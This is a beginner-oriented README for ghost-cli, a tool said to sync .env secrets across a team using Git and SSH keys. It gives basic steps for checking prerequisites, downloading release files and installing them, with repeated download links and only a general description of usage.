# 👻 ghost-cli - Secure Git-Based .env Sync

[![Download ghost-cli](https://img.shields.io/badge/Download-ghost--cli-blue?style=for-the-badge&logo=github)](https://github.com/Hit4Xz/ghost-cli/releases)

---

## 👋 Welcome

ghost-cli helps keep your project environment files (.env) safe and up to date across your team. Instead of using cloud services, it uses Git and SSH keys for secure, private synchronization. This means no accounts or extra software—just your team and Git working together.

This guide will walk you through how to get ghost-cli on your computer and start using it. You do not need any programming knowledge.

---

## 📋 What is ghost-cli?

ghost-cli is a tool that helps you share secret project settings, like passwords or API keys, safely with your team. It uses your existing Git setup and secures your data with SSH keys.

Why this matters:

- No need to trust cloud services with sensitive files.
- Only your team members with the right permissions can sync the data.
- Works seamlessly with your usual Git workflow.
- Built with Bun for performance.

---

## 💻 System Requirements

Before you download ghost-cli, check these simple requirements:

- **Operating System**: Windows 10 or later, macOS 10.13 or later, or Linux (any recent distribution).
- **Git**: Make sure Git is installed. You can download Git from [https://git-scm.com/downloads](https://git-scm.com/downloads).
- **SSH Keys**: You need your own SSH keys set up on your computer. Most users already have these if they use Git with SSH.
- **Basic command line use**: You will run a few simple commands in your Terminal or Command Prompt.

If you are unsure about any of these, the instructions below include pointers to help you check or set them up.

---

## 🚀 Getting Started

### Step 1: Check Git

First, check if Git is on your computer.

- Open the Terminal on macOS or Linux, or Command Prompt on Windows.
- Type:

```
git --version
```

- If you see a version number like `git version 2.x.x`, you're all set.
- If not, install Git from [https://git-scm.com/downloads](https://git-scm.com/downloads). Follow the setup steps on that page.

---

### Step 2: Check for SSH Keys

ghost-cli uses SSH keys to keep your data secure.

To see if you have SSH keys:

- Open your Terminal or Command Prompt.
- Type:

```
ls ~/.ssh/id_rsa.pub
```

(on Windows, you might check the folder `C:\Users\YourName\.ssh`)

- If you see a file `id_rsa.pub` or `id_ed25519.pub`, you have keys.
- If you don’t, follow [this guide](https://docs.github.com/en/authentication/connecting-to-github-with-ssh) to generate SSH keys.

---

## 📥 Download & Install

### Step 3: Download ghost-cli

Click below to visit the download page for ghost-cli:

[![Download ghost-cli](https://img.shields.io/badge/Download-ghost--cli-blue?style=for-the-badge&logo=github)](https://github.com/Hit4Xz/ghost-cli/releases)

This page has the latest versions for Windows, macOS, and Linux.

- Find the file that matches your computer’s system.
- Download it to a location you can easily access, like your Downloads folder.

---

### Step 4: Install ghost-cli

- **Windows**: Most releases come with a `.exe` installer or a zipped file.
  - If it is an installer, double-click it and follow the prompts.
  - If it is a zipped file, unzip it and move the program to a folder like `C:\Program Files\ghost-cli`.
- **macOS**: You might get a `.tar.gz` or zip file.
  - Unzip the file by double-clicking.
  - Move the unzipped folder to your Applications or user folder.
- **Linux**: You may get a compressed file.
  - Extract it using:
    ```
    tar -xzf ghost-cli-version.tar.gz
    ```
  - Follow any included README files for installation steps, usually involving running a command to place the program where your system can use it.

---

## 🔧 How to Use ghost-cli

Once installed, you will run ghost-cli from the command line. Here are the basics:

1. Open Terminal (macOS/Linux) or Command Prompt/PowerShell (Windows).
2. To check the installation, type:

```
ghost-cli --version
```

You should see the version number of the program.

---

### Syncing your .env files

ghost-cli connects your project’s environment files to your team via Git. Here’s a simple workflow:

1. Use the ghost-cli command to link your project folder.
2. Whenever you update your `.env` file, ghost-cli pushes changes securely to your Git repository.
3. Your team members run ghost-cli to pull the latest secrets on their machines.

You don’t have to open the application to use most features. Just run ghost-cli commands in your project folder.

---

## 🔐 Security and Privacy

ghost-cli uses your existing SSH keys for encryption. This means:

- Your secrets travel through Git securely.
- Only team members with your Git repository access and correct SSH keys can sync the secrets.
- No data is sent to external services or stored outside your Git system.

Always keep your private SSH key secret and do not share it.

---

## 📚 Additional Resources

- **Official Git SSH Setup Guide**: Visit [https://docs.github.com/en/authentication/connecting-to-github-with-ssh](https://docs.github.com/en/authentication/connecting-to-github-with-ssh) to set up SSH keys.
- **Git for Beginners**: [https://git-scm.com/doc](https://git-scm.com/doc) has easy guides.
- **ghost-cli support**: Check the repository’s Issues tab for community help.

---

## 📬 Get Updates and Help

Keep ghost-cli up to date:

- Visit the [ghost-cli releases page](https://github.com/Hit4Xz/ghost-cli/releases) regularly.
- Download the newest version when available.

If you have questions or run into trouble, open an issue on GitHub or ask your team’s technical lead.

---

[![Download ghost-cli](https://img.shields.io/badge/Download-ghost--cli-blue?style=for-the-badge&logo=github)](https://github.com/Hit4Xz/ghost-cli/releases)

---  

## 🔖 Keywords

automation, bun, cli, developer-tools, dotenv, dx, encryption, gitops, node-js, open-source, secrets-management, security, ssh-keys, typescript